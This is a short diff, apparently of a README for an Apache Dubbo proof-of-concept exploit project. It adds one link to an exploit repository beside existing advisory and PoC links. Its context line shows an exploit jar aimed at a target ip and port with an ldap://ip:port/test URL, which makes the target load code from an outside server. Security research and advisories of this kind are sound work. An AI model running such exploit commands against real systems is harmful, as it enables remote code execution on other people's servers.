@@ -24,3 +24,4 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202130179.java
 - https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/
 - https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/
+- https://github.com/threedr3am/dubbo-exp
